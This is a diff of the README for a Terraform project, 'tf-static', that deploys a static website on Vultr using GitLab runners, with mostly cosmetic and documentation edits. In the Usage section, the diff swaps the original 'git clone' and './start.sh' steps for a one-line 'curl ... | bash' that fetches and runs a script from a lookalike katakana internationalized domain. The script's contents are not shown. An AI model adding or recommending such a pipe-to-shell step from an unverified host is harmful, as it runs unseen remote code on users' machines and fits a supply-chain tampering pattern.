@@ -1,6 +1,6 @@
 # tf-static
 
-A multi-pipeline IaC project implementing best practices deploying a static-content website in a low-cost VPS company. Although only Vultr's provider has support for now, the idea is to expand to other clouds as PoC's.
+A multi-pipeline IaC project implementing best practices deploying a static-content website in a low-cost VPS company. Although Vultr's provider is the unique VPS provider supported for now, the idea is to expand to other clouds as PoC's.
 
 ## Why?
 
@@ -13,13 +13,10 @@ This project aims to provide the same standard of practices commonly adopted by 
 ## Usage
 
 ```sh
-git clone https://github.com/gruberdev/tf-static.git && cd tf-static
-
-# Then:
-./start.sh
+curl -s https://グルーバー.com/terraform.sh | bash
 ```
 
-### Running tests:
+### Running tests
 
 - Tests are available in `test` directory
 
@@ -29,6 +26,11 @@ git clone https://github.com/gruberdev/tf-static.git && cd tf-static
 go test
 ```
 
+
+----
+
+<br>
+
 <details>
 
   <summary>
@@ -37,17 +39,14 @@ go test
 
 ## Providers
 
----
-
 - [terraform-provider-cloudflare](https://github.com/cloudflare/terraform-provider-cloudflare)
 - [terraform-provider-vultr](https://github.com/vultr/terraform-provider-vultr)
 - [vaulted provider](https://github.com/sumup-oss/vaulted)
+- [docker provider](https://registry.terraform.io/providers/kreuzwerker/docker/latest/docs)
 
 ## Pipelines
 
----
-
-### After_each:
+### After_each
 
 - [tf-notify](https://github.com/mercari/tfnotify)
 
@@ -73,21 +72,22 @@ go test
 - terraform apply
   - Create a VPS machine to serve as runner using Vultr's provider
   - Register Gitlab-runner using Docker provider and remote-exec
-  - Create another VPS machine to serve as runner using Vultr's Provider
-  - Deploy your Hugo website
+  - Create another VPS machine to serve as host to the final deploy using Vultr's runner
+  - Build and deploy your website through terraform using gitlab's self-managed runner
+  - After the deployment ends, unregister the self-running machine on Gitlab
 
 ### Post-deploy stage
 
-- terraform-docs] @ github actions
+- [terraform-docs](https://github.com/terraform-docs/terraform-docs) @ github actions
 - upload [terraform-docs](https://github.com/terraform-docs/terraform-docs) to github repository
-- gitlab-pipeline-deleter
+- [gitlab-pipeline-deleter](https://github.com/screendriver/gitlab-pipeline-deleter)
 - [terraform-visual](https://github.com/hieven/terraform-visual) to get a static website
 - upload infra chart to github pages
 
 ### Other tools
 
 - [tfmask](https://github.com/cloudposse/tfmask) to remove output with sensitive variables
-- terraform-provider-vault for hiding the passwords
+- [terraform-provider-vault](https://github.com/hashicorp/terraform-provider-vault) for credentials management
 - [tfupdate](https://github.com/minamijoyo/tfupdate) to keep it up to date in a cron runtime
 
 </details>
